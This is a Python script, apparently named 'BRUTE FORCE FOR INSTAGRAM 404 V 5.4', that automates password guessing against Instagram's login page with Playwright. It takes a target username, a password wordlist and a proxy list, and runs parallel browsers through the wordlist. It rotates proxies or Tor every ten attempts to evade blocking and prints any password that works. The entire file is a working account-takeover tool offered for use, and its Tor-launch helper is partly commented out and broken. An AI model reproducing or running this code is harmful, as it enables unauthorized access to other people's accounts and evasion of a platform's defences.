from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
from colorama import Fore, init
import threading
import queue
import random
import sys
import requests
import time
import os
import socket

init(autoreset=True)

LOGIN_URL = "https://www.instagram.com/accounts/login/"
STATUS = requests.get(LOGIN_URL).status_code
USER = input('[+] Enter the Username: ').strip()
WORDLIST = input('[+] Enter the Password list (path): ').strip()
PROXY_FILE = input('Enter proxies file: ')

SHOW = input('if you have show the Browser(y/n): ')
if SHOW == 'y':
    kali = False,
if SHOW == 'n':
    kali = True,

try:
    with open(PROXY_FILE, "r", encoding="utf-8") as f:
        proxy_strings = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    proxies = [{"server": p} for p in proxy_strings]
except FileNotFoundError:
    print(Fore.RED + f"[-] Proxy file '{PROXY_FILE}' not found.")
    sys.exit(1)
    
TOR_PORT = 9150
TOR_PROXY_STRING = f"socks5://127.0.0.1:{TOR_PORT}"

def is_port_open(port=TOR_PORT):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex(('127.0.0.1', port))
        sock.close()
        return result == 0
    except:
        return False

# -------------------------------------------------------------------
# Function to find tor.exe in Tor Browser installation
# -------------------------------------------------------------------
def find_tor_exe():
    possible_paths = [
        os.path.expanduser("~/Desktop/Tor Browser/Browser/TorBrowser/Tor/tor.exe"),
        "C:\\Users\\Public\\Desktop\\Tor Browser\\Browser\\TorBrowser\\Tor\\tor.exe",
        "C:\\Tor Browser\\Browser\\TorBrowser\\Tor\\tor.exe",
        os.path.join(os.path.dirname(sys.executable), "Tor", "tor.exe"),  # fallback
    ]
#############################################################################################################
  #  for path in possible_paths:
   #     if os.path.exists(path):
    #        return path
    #return None
    #try:
        # Hide window on Windows
        #startupinfo = subprocess.STARTUPINFO()
       # startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        #startupinfo.wShowWindow = subprocess.SW_HIDE                        **VOID BEAR 404************************
        #process = subprocess.Popen(                                         **TOOL KITE SOCIALL********************
         #   [tor_exe],                                                      **BRUTE FORCE FOR INSTAGRAM 404 V 5.4**
          #  stdout=subprocess.DEVNULL,
           # stderr=subprocess.DEVNULL,
            #stdin=subprocess.DEVNULL,
            #startupinfo=startupinfo,
            #creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
        #)
    #except Exception as e:
     #   print(Fore.RED + f"[-] Failed to start Tor: {e}")
      #  return False
##################################################################################################################
def start_tor_background():
    tor_exe = find_tor_exe()
    if not tor_exe:
        print(Fore.RED + "[-] Could not find tor.exe automatically.")
        print(Fore.YELLOW + "[!] Please start Tor manually and rerun.")
        return False

    print(Fore.CYAN + f"[*] Starting Tor from: {tor_exe}")

    # Wait for Tor to bootstrap (up to 40 seconds)
    print(Fore.CYAN + "[*] Waiting for Tor to bootstrap (up to 40 seconds)...")
    for attempt in range(40):
        time.sleep(1)
        if is_port_open():
            print(Fore.GREEN + "[✓] Tor is ready!")
            return True
        if attempt % 10 == 0 and attempt > 0:
            print(Fore.YELLOW + f"[!] Still waiting... ({attempt}s)")

    print(Fore.RED + "[-] Tor did not start in time.")
    return False

# -------------------------------------------------------------------
# Check if any proxy is Tor; if yes, ensure Tor is running
# -------------------------------------------------------------------
need_tor = any(p['server'] == TOR_PROXY_STRING for p in proxies)
if need_tor:
    if is_port_open():
        print(Fore.GREEN + "[✓] Tor is already running.")
    else:
        ans = input("[?] Tor proxy detected but Tor is not running. Start Tor in background? (y/n): ").strip().lower()
        if ans == 'y':
            if not start_tor_background():
                print(Fore.RED + "[-] Exiting due to Tor startup failure.")
                sys.exit(1)
        else:
            print(Fore.RED + "[-] Please start Tor manually and rerun.")
            sys.exit(1)
else:
    print(Fore.CYAN + "[*] No Tor proxy in list, continuing without Tor.")

# -------------------------------------------------------------------
# Load password list
# -------------------------------------------------------------------
try:
    with open(WORDLIST, "r", encoding="utf-8") as f:
        passwords = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    print(Fore.RED + f"[-] Wordlist file '{WORDLIST}' not found.")
    sys.exit(1)

if not passwords:
    print(Fore.RED + "[-] No passwords loaded.")
    sys.exit(1)

# -------------------------------------------------------------------
# Shared queue
# -------------------------------------------------------------------
password_queue = queue.Queue()
for pwd in passwords:
    password_queue.put(pwd)

# -------------------------------------------------------------------
# Global settings
# -------------------------------------------------------------------
NUM_BROWSERS = 2          # Number of parallel browsers
stop_event = threading.Event()
found_password = None
found_lock = threading.Lock()

# Proxy rotation counters
global_proxy_index = 0
proxy_lock = threading.Lock()

def get_proxy_by_index(index):
    return proxies[index % len(proxies)]

def increment_global_proxy():
    global global_proxy_index
    with proxy_lock:
        global_proxy_index += 1

def get_global_proxy():
    with proxy_lock:
        return global_proxy_index

# Global attempt counter (for printing attempt numbers)
processed_count = 0
processed_lock = threading.Lock()

def get_next_count():
    global processed_count
    with processed_lock:
        processed_count += 1
        return processed_count

# -------------------------------------------------------------------
# Worker thread
# -------------------------------------------------------------------
def worker(worker_id):
    global found_password
    my_proxy_index = get_global_proxy()
    proxy = get_proxy_by_index(my_proxy_index)

    # Create first browser instance
    playwright = sync_playwright().start()
    browser = playwright.chromium.launch(
        headless=kali,######
        proxy=proxy,
        args=[f"--window-position={worker_id*400},0"]
    )
    context = browser.new_context(user_agent=None)
    page = context.new_page()

    try:
        while not stop_event.is_set():
            # Check if global proxy index changed
            current_global_index = get_global_proxy()
            if current_global_index != my_proxy_index:
                # Need to switch proxy → restart browser
                browser.close()
                playwright.stop()
                my_proxy_index = current_global_index
                proxy = get_proxy_by_index(my_proxy_index)
                playwright = sync_playwright().start()
                browser = playwright.chromium.launch(
                    headless=False,
                    proxy=proxy,
                    args=[f"--window-position={worker_id*400},0"]
                )
                context = browser.new_context(user_agent=None)
                page = context.new_page()
                continue

            # Get a password from the queue
            try:
                password = password_queue.get(timeout=1)
            except queue.Empty:
                break

            attempt_number = get_next_count()

            try:
                page.goto(LOGIN_URL, wait_until="domcontentloaded")
                # Accept / decline cookies (optional)
                try:
                    page.click('button:has-text("Decline optional cookies")', timeout=2000)
                except:
                    pass

                page.fill("input[name='email']", USER, delay=25)
                time.sleep(0.5)
                page.fill("input[name='pass']", password, delay=30)
                time.sleep(0.8)
                start_url = page.url
                page.get_by_role("button", name="Log in").first.click()

                # Wait for result
                error = page.locator("text=The login information you entered is incorrect.")
                try:
                    # If error message appears → failure
                    error.wait_for(state="visible", timeout=3000)
                    print(
                        Fore.YELLOW + f"[{attempt_number}] "
                        + Fore.BLUE + "Trying "
                        + Fore.WHITE + "Username: "
                        + Fore.GREEN + USER
                        + Fore.WHITE + " | Password: "
                        + Fore.RED + password
                        + Fore.WHITE + " | Status: "
                        + Fore.YELLOW + str(STATUS)
                        + Fore.BLUE + " => Login Failed "
                    )
                except PlaywrightTimeoutError:
                    # No error message, maybe success
                    try:
                        page.wait_for_url(lambda url: url != start_url and "login" not in url.lower(), timeout=3000)
                        print(
                            Fore.YELLOW + f"[{attempt_number}] "
                            + Fore.GREEN + "Trying "
                            + Fore.WHITE + "Username: "
                            + Fore.GREEN + USER
                            + Fore.WHITE + " | Password: "
                            + Fore.GREEN + password
                            + Fore.WHITE + " | Status: "
                            + Fore.YELLOW + str(STATUS)
                            + Fore.GREEN + " => Login SUCCESS "
                        )
                        with found_lock:
                            found_password = password
                        stop_event.set()
                        break
                    except PlaywrightTimeoutError:
                        print(
                            Fore.YELLOW + f"[{attempt_number}] "
                            + Fore.BLUE + "Trying "
                            + Fore.WHITE + "Username: "
                            + Fore.GREEN + USER
                            + Fore.WHITE + " | Password: "
                            + Fore.RED + password
                            + Fore.WHITE + " | Status: "
                            + Fore.YELLOW + str(STATUS)
                            + Fore.BLUE + " => Login Failed (no response)"
                        )
            except Exception as e:
                print(Fore.RED + f"[Browser {worker_id}] Error: {e}")
            finally:
                password_queue.task_done()
                # After every 10 attempts, rotate global proxy
                if attempt_number % 10 == 0:
                    increment_global_proxy()

    finally:
        browser.close()
        playwright.stop()
    print(Fore.CYAN + f"[Browser {worker_id}] finished.")

# -------------------------------------------------------------------
# Start threads
# -------------------------------------------------------------------
threads = []
for i in range(1, NUM_BROWSERS + 1):
    t = threading.Thread(target=worker, args=(i,))
    t.start()
    threads.append(t)

# Wait for all threads to finish
for t in threads:
    t.join()

# -------------------------------------------------------------------
# Final result
# -------------------------------------------------------------------
if found_password:
    print(Fore.GREEN + f"\n Correct password found: {found_password}")
else:
    print(Fore.RED + "\n No password found.")